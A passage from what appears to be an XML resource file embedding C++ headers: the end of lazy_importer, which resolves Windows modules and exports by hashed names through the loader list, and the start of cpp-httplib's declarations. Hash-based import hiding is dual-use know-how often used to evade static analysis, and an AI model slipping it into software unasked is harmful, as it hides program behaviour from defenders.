            const auto ui_ied = reinterpret_cast&lt;const char*&gt;(_ied);
            return (export_address &gt; ui_ied &amp;&amp; export_address &lt; ui_ied + _ied_size);
        }
    };

    struct safe_module_enumerator {
        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T;
        value_type* value;
        value_type* head;

        LAZY_IMPORTER_FORCEINLINE safe_module_enumerator() noexcept
            : safe_module_enumerator(ldr_data_entry())
        {}

        LAZY_IMPORTER_FORCEINLINE
        safe_module_enumerator(const detail::win::LDR_DATA_TABLE_ENTRY_T* ldr) noexcept
            : value(ldr-&gt;load_order_next()), head(value)
        {}

        LAZY_IMPORTER_FORCEINLINE void reset() noexcept
        {
            value = head-&gt;load_order_next();
        }

        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
        {
            value = value-&gt;load_order_next();

            return value != head &amp;&amp; value-&gt;DllBase;
        }
    };

    struct unsafe_module_enumerator {
        using value_type = const detail::win::LDR_DATA_TABLE_ENTRY_T*;
        value_type value;

        LAZY_IMPORTER_FORCEINLINE unsafe_module_enumerator() noexcept
            : value(ldr_data_entry())
        {}

        LAZY_IMPORTER_FORCEINLINE void reset() noexcept { value = ldr_data_entry(); }

        LAZY_IMPORTER_FORCEINLINE bool next() noexcept
        {
            value = value-&gt;load_order_next();
            return true;
        }
    };

    // provides the cached functions which use Derive classes methods
    template&lt;class Derived, class DefaultType = void*&gt;
    class lazy_base {
    protected:
        // This function is needed because every templated function
        // with different args has its own static buffer
        LAZY_IMPORTER_FORCEINLINE static void*&amp; _cache() noexcept
        {
            static void* value = nullptr;
            return value;
        }

    public:
        template&lt;class T = DefaultType&gt;
        LAZY_IMPORTER_FORCEINLINE static T safe() noexcept
        {
            return Derived::template get&lt;T, safe_module_enumerator&gt;();
        }

        template&lt;class T = DefaultType, class Enum = unsafe_module_enumerator&gt;
        LAZY_IMPORTER_FORCEINLINE static T cached() noexcept
        {
            auto&amp; cached = _cache();
            if(!cached)
                cached = Derived::template get&lt;void*, Enum&gt;();

            return (T)(cached);
        }

        template&lt;class T = DefaultType&gt;
        LAZY_IMPORTER_FORCEINLINE static T safe_cached() noexcept
        {
            return cached&lt;T, safe_module_enumerator&gt;();
        }
    };

    template&lt;offset_hash_pair OHP&gt;
    struct lazy_module : lazy_base&lt;lazy_module&lt;OHP&gt;&gt; {
        template&lt;class T = void*, class Enum = unsafe_module_enumerator&gt;
        LAZY_IMPORTER_FORCEINLINE static T get() noexcept
        {
            Enum e;
            do {
                if(hash(e.value-&gt;BaseDllName, get_offset(OHP)) == get_hash(OHP))
                    return (T)(e.value-&gt;DllBase);
            } while(e.next());
            return {};
        }

        template&lt;class T = void*, class Ldr&gt;
        LAZY_IMPORTER_FORCEINLINE static T in(Ldr ldr) noexcept
        {
            safe_module_enumerator e(reinterpret_cast&lt;const detail::win::LDR_DATA_TABLE_ENTRY_T*&gt;(ldr));
            do {
                if(hash(e.value-&gt;BaseDllName, get_offset(OHP)) == get_hash(OHP))
                    return (T)(e.value-&gt;DllBase);
            } while(e.next());
            return {};
        }

        template&lt;class T = void*, class Ldr&gt;
        LAZY_IMPORTER_FORCEINLINE static T in_cached(Ldr ldr) noexcept
        {
            auto&amp; cached = lazy_base&lt;lazy_module&lt;OHP&gt;&gt;::_cache();
            if(!cached)
                cached = in(ldr);

            return (T)(cached);
        }
    };

    template&lt;offset_hash_pair OHP, class T&gt;
    struct lazy_function : lazy_base&lt;lazy_function&lt;OHP, T&gt;, T&gt; {
        using base_type = lazy_base&lt;lazy_function&lt;OHP, T&gt;, T&gt;;

        template&lt;class... Args&gt;
        LAZY_IMPORTER_FORCEINLINE decltype(auto) operator()(Args&amp;&amp;... args) const
        {
#ifndef LAZY_IMPORTER_CACHE_OPERATOR_PARENS
            return get()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
#else
            return this-&gt;cached()(LAZY_IMPORTER_CPP_FORWARD(Args, args)...);
#endif
        }

        template&lt;class F = T, class Enum = unsafe_module_enumerator&gt;
        LAZY_IMPORTER_FORCEINLINE static F get() noexcept
        {
            // for backwards compatability.
            // Before 2.0 it was only possible to resolve forwarded exports when
            // this macro was enabled
#ifdef LAZY_IMPORTER_RESOLVE_FORWARDED_EXPORTS
            return forwarded&lt;F, Enum&gt;();
#else

            Enum e;

            do {
#ifdef LAZY_IMPORTER_HARDENED_MODULE_CHECKS
                if(!e.value-&gt;DllBase || !e.value-&gt;FullDllName.Length)
                    continue;
#endif

                const exports_directory exports(e.value-&gt;DllBase);

                if(exports) {
                    auto export_index = exports.size();
                    while(export_index--)
                        if(hash(exports.name(export_index), get_offset(OHP)) == get_hash(OHP))
                            return (F)(exports.address(export_index));
                }
            } while(e.next());
            return {};
#endif
        }

        template&lt;class F = T, class Enum = unsafe_module_enumerator&gt;
        LAZY_IMPORTER_FORCEINLINE static F forwarded() noexcept
        {
            detail::win::UNICODE_STRING_T name;
            forwarded_hashes              hashes{ 0, get_hash(OHP) };

            Enum e;
            do {
                name = e.value-&gt;BaseDllName;
                name.Length -= 8; // get rid of .dll extension

                if(!hashes.module_hash || hash(name, get_offset(OHP)) == hashes.module_hash) {
                    const exports_directory exports(e.value-&gt;DllBase);

                    if(exports) {
                        auto export_index = exports.size();
                        while(export_index--)
                            if(hash(exports.name(export_index), get_offset(OHP)) == hashes.function_hash) {
                                const auto addr = exports.address(export_index);

                                if(exports.is_forwarded(addr)) {
                                    hashes = hash_forwarded(
                                        reinterpret_cast&lt;const char*&gt;(addr),
                                        get_offset(OHP));

                                    e.reset();
                                    break;
                                }
                                return (F)(addr);
                            }
                    }
                }
            } while(e.next());
            return {};
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe() noexcept
        {
            return forwarded&lt;F, safe_module_enumerator&gt;();
        }

        template&lt;class F = T, class Enum = unsafe_module_enumerator&gt;
        LAZY_IMPORTER_FORCEINLINE static F forwarded_cached() noexcept
        {
            auto&amp; value = base_type::_cache();
            if(!value)
                value = forwarded&lt;void*, Enum&gt;();
            return (F)(value);
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F forwarded_safe_cached() noexcept
        {
            return forwarded_cached&lt;F, safe_module_enumerator&gt;();
        }

        template&lt;class F = T, bool IsSafe = false, class Module&gt;
        LAZY_IMPORTER_FORCEINLINE static F in(Module m) noexcept
        {
            if(IsSafe &amp;&amp; !m)
                return {};

            const exports_directory exports((const char*)(m));
            if(IsSafe &amp;&amp; !exports)
                return {};

            for(unsigned long i{};; ++i) {
                if(IsSafe &amp;&amp; i == exports.size())
                    break;

                if(hash(exports.name(i), get_offset(OHP)) == get_hash(OHP))
                    return (F)(exports.address(i));
            }
            return {};
        }

        template&lt;class F = T, class Module&gt;
        LAZY_IMPORTER_FORCEINLINE static F in_safe(Module m) noexcept
        {
            return in&lt;F, true&gt;(m);
        }

        template&lt;class F = T, bool IsSafe = false, class Module&gt;
        LAZY_IMPORTER_FORCEINLINE static F in_cached(Module m) noexcept
        {
            auto&amp; value = base_type::_cache();
            if(!value)
                value = in&lt;void*, IsSafe&gt;(m);
            return (F)(value);
        }

        template&lt;class F = T, class Module&gt;
        LAZY_IMPORTER_FORCEINLINE static F in_safe_cached(Module m) noexcept
        {
            return in_cached&lt;F, true&gt;(m);
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F nt() noexcept
        {
            return in&lt;F&gt;(ldr_data_entry()-&gt;load_order_next()-&gt;DllBase);
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F nt_safe() noexcept
        {
            return in_safe&lt;F&gt;(ldr_data_entry()-&gt;load_order_next()-&gt;DllBase);
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F nt_cached() noexcept
        {
            return in_cached&lt;F&gt;(ldr_data_entry()-&gt;load_order_next()-&gt;DllBase);
        }

        template&lt;class F = T&gt;
        LAZY_IMPORTER_FORCEINLINE static F nt_safe_cached() noexcept
        {
            return in_safe_cached&lt;F&gt;(ldr_data_entry()-&gt;load_order_next()-&gt;DllBase);
        }
    };

}} // namespace li::detail

#endif // include guard
</value>
  </data>
  <data name="httplib_h" xml:space="preserve">
    <value>//
//  httplib.h
//
//  Copyright (c) 2025 Yuji Hirose. All rights reserved.
//  MIT License
//

#ifndef CPPHTTPLIB_HTTPLIB_H
#define CPPHTTPLIB_HTTPLIB_H

#define CPPHTTPLIB_VERSION "0.19.0"

/*
 * Configuration
 */

#ifndef CPPHTTPLIB_KEEPALIVE_TIMEOUT_SECOND
#define CPPHTTPLIB_KEEPALIVE_TIMEOUT_SECOND 5
#endif

#ifndef CPPHTTPLIB_KEEPALIVE_TIMEOUT_CHECK_INTERVAL_USECOND
#define CPPHTTPLIB_KEEPALIVE_TIMEOUT_CHECK_INTERVAL_USECOND 10000
#endif

#ifndef CPPHTTPLIB_KEEPALIVE_MAX_COUNT
#define CPPHTTPLIB_KEEPALIVE_MAX_COUNT 100
#endif

#ifndef CPPHTTPLIB_CONNECTION_TIMEOUT_SECOND
#define CPPHTTPLIB_CONNECTION_TIMEOUT_SECOND 300
#endif

#ifndef CPPHTTPLIB_CONNECTION_TIMEOUT_USECOND
#define CPPHTTPLIB_CONNECTION_TIMEOUT_USECOND 0
#endif

#ifndef CPPHTTPLIB_SERVER_READ_TIMEOUT_SECOND
#define CPPHTTPLIB_SERVER_READ_TIMEOUT_SECOND 5
#endif

#ifndef CPPHTTPLIB_SERVER_READ_TIMEOUT_USECOND
#define CPPHTTPLIB_SERVER_READ_TIMEOUT_USECOND 0
#endif

#ifndef CPPHTTPLIB_SERVER_WRITE_TIMEOUT_SECOND
#define CPPHTTPLIB_SERVER_WRITE_TIMEOUT_SECOND 5
#endif

#ifndef CPPHTTPLIB_SERVER_WRITE_TIMEOUT_USECOND
#define CPPHTTPLIB_SERVER_WRITE_TIMEOUT_USECOND 0
#endif

#ifndef CPPHTTPLIB_CLIENT_READ_TIMEOUT_SECOND
#define CPPHTTPLIB_CLIENT_READ_TIMEOUT_SECOND 300
#endif

#ifndef CPPHTTPLIB_CLIENT_READ_TIMEOUT_USECOND
#define CPPHTTPLIB_CLIENT_READ_TIMEOUT_USECOND 0
#endif

#ifndef CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_SECOND
#define CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_SECOND 5
#endif

#ifndef CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_USECOND
#define CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_USECOND 0
#endif

#ifndef CPPHTTPLIB_CLIENT_MAX_TIMEOUT_MSECOND
#define CPPHTTPLIB_CLIENT_MAX_TIMEOUT_MSECOND 0
#endif

#ifndef CPPHTTPLIB_IDLE_INTERVAL_SECOND
#define CPPHTTPLIB_IDLE_INTERVAL_SECOND 0
#endif

#ifndef CPPHTTPLIB_IDLE_INTERVAL_USECOND
#ifdef _WIN32
#define CPPHTTPLIB_IDLE_INTERVAL_USECOND 10000
#else
#define CPPHTTPLIB_IDLE_INTERVAL_USECOND 0
#endif
#endif

#ifndef CPPHTTPLIB_REQUEST_URI_MAX_LENGTH
#define CPPHTTPLIB_REQUEST_URI_MAX_LENGTH 8192
#endif

#ifndef CPPHTTPLIB_HEADER_MAX_LENGTH
#define CPPHTTPLIB_HEADER_MAX_LENGTH 8192
#endif

#ifndef CPPHTTPLIB_REDIRECT_MAX_COUNT
#define CPPHTTPLIB_REDIRECT_MAX_COUNT 20
#endif

#ifndef CPPHTTPLIB_MULTIPART_FORM_DATA_FILE_MAX_COUNT
#define CPPHTTPLIB_MULTIPART_FORM_DATA_FILE_MAX_COUNT 1024
#endif

#ifndef CPPHTTPLIB_PAYLOAD_MAX_LENGTH
#define CPPHTTPLIB_PAYLOAD_MAX_LENGTH ((std::numeric_limits&lt;size_t&gt;::max)())
#endif

#ifndef CPPHTTPLIB_FORM_URL_ENCODED_PAYLOAD_MAX_LENGTH
#define CPPHTTPLIB_FORM_URL_ENCODED_PAYLOAD_MAX_LENGTH 8192
#endif

#ifndef CPPHTTPLIB_RANGE_MAX_COUNT
#define CPPHTTPLIB_RANGE_MAX_COUNT 1024
#endif

#ifndef CPPHTTPLIB_TCP_NODELAY
#define CPPHTTPLIB_TCP_NODELAY false
#endif

#ifndef CPPHTTPLIB_IPV6_V6ONLY
#define CPPHTTPLIB_IPV6_V6ONLY false
#endif

#ifndef CPPHTTPLIB_RECV_BUFSIZ
#define CPPHTTPLIB_RECV_BUFSIZ size_t(16384u)
#endif

#ifndef CPPHTTPLIB_COMPRESSION_BUFSIZ
#define CPPHTTPLIB_COMPRESSION_BUFSIZ size_t(16384u)
#endif

#ifndef CPPHTTPLIB_THREAD_POOL_COUNT
#define CPPHTTPLIB_THREAD_POOL_COUNT                                           \
  ((std::max)(8u, std::thread::hardware_concurrency() &gt; 0                      \
                      ? std::thread::hardware_concurrency() - 1                \
                      : 0))
#endif

#ifndef CPPHTTPLIB_RECV_FLAGS
#define CPPHTTPLIB_RECV_FLAGS 0
#endif

#ifndef CPPHTTPLIB_SEND_FLAGS
#define CPPHTTPLIB_SEND_FLAGS 0
#endif

#ifndef CPPHTTPLIB_LISTEN_BACKLOG
#define CPPHTTPLIB_LISTEN_BACKLOG 5
#endif

/*
 * Headers
 */

#ifdef _WIN32
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif //_CRT_SECURE_NO_WARNINGS

#ifndef _CRT_NONSTDC_NO_DEPRECATE
#define _CRT_NONSTDC_NO_DEPRECATE
#endif //_CRT_NONSTDC_NO_DEPRECATE

#if defined(_MSC_VER)
#if _MSC_VER &lt; 1900
#error Sorry, Visual Studio versions prior to 2015 are not supported
#endif

#pragma comment(lib, "ws2_32.lib")

#ifdef _WIN64
using ssize_t = __int64;
#else
using ssize_t = long;
#endif
#endif // _MSC_VER

#ifndef S_ISREG
#define S_ISREG(m) (((m) &amp; S_IFREG) == S_IFREG)
#endif // S_ISREG

#ifndef S_ISDIR
#define S_ISDIR(m) (((m) &amp; S_IFDIR) == S_IFDIR)
#endif // S_ISDIR

#ifndef NOMINMAX
#define NOMINMAX
#endif // NOMINMAX

#include &lt;io.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;ws2tcpip.h&gt;

#ifndef WSA_FLAG_NO_HANDLE_INHERIT
#define WSA_FLAG_NO_HANDLE_INHERIT 0x80
#endif

using socket_t = SOCKET;
using socklen_t = int;
#ifdef CPPHTTPLIB_USE_POLL
#define poll(fds, nfds, timeout) WSAPoll(fds, nfds, timeout)
#endif

#else // not _WIN32

#include &lt;arpa/inet.h&gt;
#if !defined(_AIX) &amp;&amp; !defined(__MVS__)
#include &lt;ifaddrs.h&gt;
#endif
#ifdef __MVS__
#include &lt;strings.h&gt;
#ifndef NI_MAXHOST
#define NI_MAXHOST 1025
#endif
#endif
#include &lt;net/if.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#ifdef __linux__
#include &lt;resolv.h&gt;
#endif
#include &lt;netinet/tcp.h&gt;
#ifdef CPPHTTPLIB_USE_POLL
#include &lt;poll.h&gt;
#endif
#include &lt;csignal&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/mman.h&gt;
#ifndef __VMS
#include &lt;sys/select.h&gt;
#endif
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;unistd.h&gt;

using socket_t = int;
#ifndef INVALID_SOCKET
#define INVALID_SOCKET (-1)
#endif
#endif //_WIN32

#include &lt;algorithm&gt;
#include &lt;array&gt;
#include &lt;atomic&gt;
#include &lt;cassert&gt;
#include &lt;cctype&gt;
#include &lt;climits&gt;
#include &lt;condition_variable&gt;
#include &lt;cstring&gt;
#include &lt;errno.h&gt;
#include &lt;exception&gt;
#include &lt;fcntl.h&gt;
#include &lt;fstream&gt;
#include &lt;functional&gt;
#include &lt;iomanip&gt;
#include &lt;iostream&gt;
#include &lt;list&gt;
#include &lt;map&gt;
#include &lt;memory&gt;
#include &lt;mutex&gt;
#include &lt;random&gt;
#include &lt;regex&gt;
#include &lt;set&gt;
#include &lt;sstream&gt;
#include &lt;string&gt;
#include &lt;sys/stat.h&gt;
#include &lt;thread&gt;
#include &lt;unordered_map&gt;
#include &lt;unordered_set&gt;
#include &lt;utility&gt;

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
#ifdef _WIN32
#include &lt;wincrypt.h&gt;

// these are defined in wincrypt.h and it breaks compilation if BoringSSL is
// used
#undef X509_NAME
#undef X509_CERT_PAIR
#undef X509_EXTENSIONS
#undef PKCS7_SIGNER_INFO

#ifdef _MSC_VER
#pragma comment(lib, "crypt32.lib")
#endif
#elif defined(CPPHTTPLIB_USE_CERTS_FROM_MACOSX_KEYCHAIN) &amp;&amp; defined(__APPLE__)
#include &lt;TargetConditionals.h&gt;
#if TARGET_OS_OSX
#include &lt;CoreFoundation/CoreFoundation.h&gt;
#include &lt;Security/Security.h&gt;
#endif // TARGET_OS_OSX
#endif // _WIN32

#include &lt;openssl/err.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/ssl.h&gt;
#include &lt;openssl/x509v3.h&gt;

#if defined(_WIN32) &amp;&amp; defined(OPENSSL_USE_APPLINK)
#include &lt;openssl/applink.c&gt;
#endif

#include &lt;iostream&gt;
#include &lt;sstream&gt;

#if defined(OPENSSL_IS_BORINGSSL) || defined(LIBRESSL_VERSION_NUMBER)
#if OPENSSL_VERSION_NUMBER &lt; 0x1010107f
#error Please use OpenSSL or a current version of BoringSSL
#endif
#define SSL_get1_peer_certificate SSL_get_peer_certificate
#elif OPENSSL_VERSION_NUMBER &lt; 0x30000000L
#error Sorry, OpenSSL versions prior to 3.0.0 are not supported
#endif

#endif

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
#include &lt;zlib.h&gt;
#endif

#ifdef CPPHTTPLIB_BROTLI_SUPPORT
#include &lt;brotli/decode.h&gt;
#include &lt;brotli/encode.h&gt;
#endif

/*
 * Declaration
 */
namespace httplib {

namespace detail {

/*
 * Backport std::make_unique from C++14.
 *
 * NOTE: This code came up with the following stackoverflow post:
 * https://stackoverflow.com/questions/10149840/c-arrays-and-make-unique
 *
 */

template &lt;class T, class... Args&gt;
typename std::enable_if&lt;!std::is_array&lt;T&gt;::value, std::unique_ptr&lt;T&gt;&gt;::type
make_unique(Args &amp;&amp;...args) {
  return std::unique_ptr&lt;T&gt;(new T(std::forward&lt;Args&gt;(args)...));
}

template &lt;class T&gt;
typename std::enable_if&lt;std::is_array&lt;T&gt;::value, std::unique_ptr&lt;T&gt;&gt;::type
make_unique(std::size_t n) {
  typedef typename std::remove_extent&lt;T&gt;::type RT;
  return std::unique_ptr&lt;T&gt;(new RT[n]);
}

namespace case_ignore {

inline unsigned char to_lower(int c) {
  const static unsigned char table[256] = {
      0,   1,   2,   3,   4,   5,   6,   7,   8,   9,   10,  11,  12,  13,  14,
      15,  16,  17,  18,  19,  20,  21,  22,  23,  24,  25,  26,  27,  28,  29,
      30,  31,  32,  33,  34,  35,  36,  37,  38,  39,  40,  41,  42,  43,  44,
      45,  46,  47,  48,  49,  50,  51,  52,  53,  54,  55,  56,  57,  58,  59,
      60,  61,  62,  63,  64,  97,  98,  99,  100, 101, 102, 103, 104, 105, 106,
      107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121,
      122, 91,  92,  93,  94,  95,  96,  97,  98,  99,  100, 101, 102, 103, 104,
      105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119,
      120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134,
      135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149,
      150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164,
      165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179,
      180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 224, 225, 226,
      227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241,
      242, 243, 244, 245, 246, 215, 248, 249, 250, 251, 252, 253, 254, 223, 224,
      225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239,
      240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254,
      255,
  };
  return table[(unsigned char)(char)c];
}

inline bool equal(const std::string &amp;a, const std::string &amp;b) {
  return a.size() == b.size() &amp;&amp;
         std::equal(a.begin(), a.end(), b.begin(), [](char ca, char cb) {
           return to_lower(ca) == to_lower(cb);
         });
}

struct equal_to {
  bool operator()(const std::string &amp;a, const std::string &amp;b) const {
    return equal(a, b);
  }
};

struct hash {
  size_t operator()(const std::string &amp;key) const {
    return hash_core(key.data(), key.size(), 0);
  }

  size_t hash_core(const char *s, size_t l, size_t h) const {
    return (l == 0) ? h
                    : hash_core(s + 1, l - 1,
                                // Unsets the 6 high bits of h, therefore no
                                // overflow happens
                                (((std::numeric_limits&lt;size_t&gt;::max)() &gt;&gt; 6) &amp;
                                 h * 33) ^
                                    static_cast&lt;unsigned char&gt;(to_lower(*s)));
  }
};

} // namespace case_ignore

// This is based on
// "http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2014/n4189".

struct scope_exit {
  explicit scope_exit(std::function&lt;void(void)&gt; &amp;&amp;f)
      : exit_function(std::move(f)), execute_on_destruction{true} {}

  scope_exit(scope_exit &amp;&amp;rhs) noexcept
      : exit_function(std::move(rhs.exit_function)),
        execute_on_destruction{rhs.execute_on_destruction} {
    rhs.release();
  }

  ~scope_exit() {
    if (execute_on_destruction) { this-&gt;exit_function(); }
  }

  void release() { this-&gt;execute_on_destruction = false; }

private:
  scope_exit(const scope_exit &amp;) = delete;
  void operator=(const scope_exit &amp;) = delete;
  scope_exit &amp;operator=(scope_exit &amp;&amp;) = delete;

  std::function&lt;void(void)&gt; exit_function;
  bool execute_on_destruction;
};

} // namespace detail

enum StatusCode {
  // Information responses
  Continue_100 = 100,
  SwitchingProtocol_101 = 101,
  Processing_102 = 102,
  EarlyHints_103 = 103,

  // Successful responses
  OK_200 = 200,
  Created_201 = 201,
  Accepted_202 = 202,
  NonAuthoritativeInformation_203 = 203,
  NoContent_204 = 204,
  ResetContent_205 = 205,
  PartialContent_206 = 206,
  MultiStatus_207 = 207,
  AlreadyReported_208 = 208,
  IMUsed_226 = 226,

  // Redirection messages
  MultipleChoices_300 = 300,
  MovedPermanently_301 = 301,
  Found_302 = 302,
  SeeOther_303 = 303,
  NotModified_304 = 304,
  UseProxy_305 = 305,
  unused_306 = 306,
  TemporaryRedirect_307 = 307,
  PermanentRedirect_308 = 308,

  // Client error responses
  BadRequest_400 = 400,
  Unauthorized_401 = 401,
  PaymentRequired_402 = 402,
  Forbidden_403 = 403,
  NotFound_404 = 404,
  MethodNotAllowed_405 = 405,
  NotAcceptable_406 = 406,
  ProxyAuthenticationRequired_407 = 407,
  RequestTimeout_408 = 408,
  Conflict_409 = 409,
  Gone_410 = 410,
  LengthRequired_411 = 411,
  PreconditionFailed_412 = 412,
  PayloadTooLarge_413 = 413,
  UriTooLong_414 = 414,
  UnsupportedMediaType_415 = 415,
  RangeNotSatisfiable_416 = 416,
  ExpectationFailed_417 = 417,
  ImATeapot_418 = 418,
  MisdirectedRequest_421 = 421,
  UnprocessableContent_422 = 422,
  Locked_423 = 423,
  FailedDependency_424 = 424,
  TooEarly_425 = 425,
  UpgradeRequired_426 = 426,
  PreconditionRequired_428 = 428,
  TooManyRequests_429 = 429,
  RequestHeaderFieldsTooLarge_431 = 431,
  UnavailableForLegalReasons_451 = 451,

  // Server error responses
  InternalServerError_500 = 500,
  NotImplemented_501 = 501,
  BadGateway_502 = 502,
  ServiceUnavailable_503 = 503,
  GatewayTimeout_504 = 504,
  HttpVersionNotSupported_505 = 505,
  VariantAlsoNegotiates_506 = 506,
  InsufficientStorage_507 = 507,
  LoopDetected_508 = 508,
  NotExtended_510 = 510,
  NetworkAuthenticationRequired_511 = 511,
};

using Headers =
    std::unordered_multimap&lt;std::string, std::string, detail::case_ignore::hash,
                            detail::case_ignore::equal_to&gt;;

using Params = std::multimap&lt;std::string, std::string&gt;;
using Match = std::smatch;

using Progress = std::function&lt;bool(uint64_t current, uint64_t total)&gt;;

struct Response;
using ResponseHandler = std::function&lt;bool(const Response &amp;response)&gt;;

struct MultipartFormData {
  std::string name;
  std::string content;
  std::string filename;
  std::string content_type;
};
using MultipartFormDataItems = std::vector&lt;MultipartFormData&gt;;
using MultipartFormDataMap = std::multimap&lt;std::string, MultipartFormData&gt;;

class DataSink {
public:
  DataSink() : os(&amp;sb_), sb_(*this) {}

  DataSink(const DataSink &amp;) = delete;
  DataSink &amp;operator=(const DataSink &amp;) = delete;
  DataSink(DataSink &amp;&amp;) = delete;
  DataSink &amp;operator=(DataSink &amp;&amp;) = delete;

  std::function&lt;bool(const char *data, size_t data_len)&gt; write;
  std::function&lt;bool()&gt; is_writable;
  std::function&lt;void()&gt; done;
  std::function&lt;void(const Headers &amp;trailer)&gt; done_with_trailer;
  std::ostream os;

private:
  class data_sink_streambuf final : public std::streambuf {
  public:
    explicit data_sink_streambuf(DataSink &amp;sink) : sink_(sink) {}

  protected:
    std::streamsize xsputn(const char *s, std::streamsize n) override {
      sink_.write(s, static_cast&lt;size_t&gt;(n));
      return n;
    }

  private:
    DataSink &amp;sink_;
  };

  data_sink_streambuf sb_;
};

using ContentProvider =
    std::function&lt;bool(size_t offset, size_t length, DataSink &amp;sink)&gt;;

using ContentProviderWithoutLength =
    std::function&lt;bool(size_t offset, DataSink &amp;sink)&gt;;

using ContentProviderResourceReleaser = std::function&lt;void(bool success)&gt;;

struct MultipartFormDataProvider {
  std::string name;
  ContentProviderWithoutLength provider;
  std::string filename;
  std::string content_type;
};
using MultipartFormDataProviderItems = std::vector&lt;MultipartFormDataProvider&gt;;

using ContentReceiverWithProgress =
    std::function&lt;bool(const char *data, size_t data_length, uint64_t offset,
                       uint64_t total_length)&gt;;

using ContentReceiver =
    std::function&lt;bool(const char *data, size_t data_length)&gt;;

using MultipartContentHeader =
    std::function&lt;bool(const MultipartFormData &amp;file)&gt;;

class ContentReader {
public:
  using Reader = std::function&lt;bool(ContentReceiver receiver)&gt;;
  using MultipartReader = std::function&lt;bool(MultipartContentHeader header,
                                             ContentReceiver receiver)&gt;;

  ContentReader(Reader reader, MultipartReader multipart_reader)
      : reader_(std::move(reader)),
        multipart_reader_(std::move(multipart_reader)) {}

  bool operator()(MultipartContentHeader header,
                  ContentReceiver receiver) const {
    return multipart_reader_(std::move(header), std::move(receiver));
  }

  bool operator()(ContentReceiver receiver) const {
    return reader_(std::move(receiver));
  }

  Reader reader_;
  MultipartReader multipart_reader_;
};

using Range = std::pair&lt;ssize_t, ssize_t&gt;;
using Ranges = std::vector&lt;Range&gt;;

struct Request {
  std::string method;
  std::string path;
  Params params;
  Headers headers;
  std::string body;

  std::string remote_addr;
  int remote_port = -1;
  std::string local_addr;
  int local_port = -1;

  // for server
  std::string version;
  std::string target;
  MultipartFormDataMap files;
  Ranges ranges;
  Match matches;
  std::unordered_map&lt;std::string, std::string&gt; path_params;
  std::function&lt;bool()&gt; is_connection_closed = []() { return true; };

  // for client
  ResponseHandler response_handler;
  ContentReceiverWithProgress content_receiver;
  Progress progress;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  const SSL *ssl = nullptr;
#endif

  bool has_header(const std::string &amp;key) const;
  std::string get_header_value(const std::string &amp;key, const char *def = "",
                               size_t id = 0) const;
  uint64_t get_header_value_u64(const std::string &amp;key, uint64_t def = 0,
                                size_t id = 0) const;
  size_t get_header_value_count(const std::string &amp;key) const;
  void set_header(const std::string &amp;key, const std::string &amp;val);

  bool has_param(const std::string &amp;key) const;
  std::string get_param_value(const std::string &amp;key, size_t id = 0) const;
  size_t get_param_value_count(const std::string &amp;key) const;

  bool is_multipart_form_data() const;

  bool has_file(const std::string &amp;key) const;
  MultipartFormData get_file_value(const std::string &amp;key) const;
  std::vector&lt;MultipartFormData&gt; get_file_values(const std::string &amp;key) const;

  // private members...
  size_t redirect_count_ = CPPHTTPLIB_REDIRECT_MAX_COUNT;
  size_t content_length_ = 0;
  ContentProvider content_provider_;
  bool is_chunked_content_provider_ = false;
  size_t authorization_count_ = 0;
  std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time_ =
      (std::chrono::steady_clock::time_point::min)();
};

struct Response {
  std::string version;
  int status = -1;
  std::string reason;
  Headers headers;
  std::string body;
  std::string location; // Redirect location

  bool has_header(const std::string &amp;key) const;
  std::string get_header_value(const std::string &amp;key, const char *def = "",
                               size_t id = 0) const;
  uint64_t get_header_value_u64(const std::string &amp;key, uint64_t def = 0,
                                size_t id = 0) const;
  size_t get_header_value_count(const std::string &amp;key) const;
  void set_header(const std::string &amp;key, const std::string &amp;val);

  void set_redirect(const std::string &amp;url, int status = StatusCode::Found_302);
  void set_content(const char *s, size_t n, const std::string &amp;content_type);
  void set_content(const std::string &amp;s, const std::string &amp;content_type);
  void set_content(std::string &amp;&amp;s, const std::string &amp;content_type);

  void set_content_provider(
      size_t length, const std::string &amp;content_type, ContentProvider provider,
      ContentProviderResourceReleaser resource_releaser = nullptr);

  void set_content_provider(
      const std::string &amp;content_type, ContentProviderWithoutLength provider,
      ContentProviderResourceReleaser resource_releaser = nullptr);

  void set_chunked_content_provider(
      const std::string &amp;content_type, ContentProviderWithoutLength provider,
      ContentProviderResourceReleaser resource_releaser = nullptr);

  void set_file_content(const std::string &amp;path,
                        const std::string &amp;content_type);
  void set_file_content(const std::string &amp;path);

